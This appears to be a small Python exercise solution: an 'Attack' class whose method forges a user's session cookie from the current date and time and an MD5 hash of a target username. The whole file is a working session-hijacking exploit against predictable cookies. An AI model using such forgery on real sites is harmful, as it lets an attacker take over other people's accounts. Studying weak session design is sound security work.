from web_tools import *
import datetime
import hashlib


class Attack(Web_tools):
    

    @classmethod
    def get_cookie(cls, target_name = "nataliw4"):
        # ---------------------------------------------- #
        # This function create a cookie of user by his name and date
        # :param target_name: the name of the user to get cookie from
        # :type target_name: str
        # :return: none
        # ---------------------------------------------- #
        
        cookie = ""
        date = datetime.datetime.today()
        cookie += str(date.strftime("%d%m%Y")) + "."
        name_hash = hashlib.md5(target_name.encode())
        cookie += name_hash.hexdigest() + "."
        cookie += str(date.strftime("%#H%#M")) + "."
        cookie += str(date.strftime("%d%m%Y"))

        print(f"[INFO] The cookie is: {cookie}") 

        return cookie
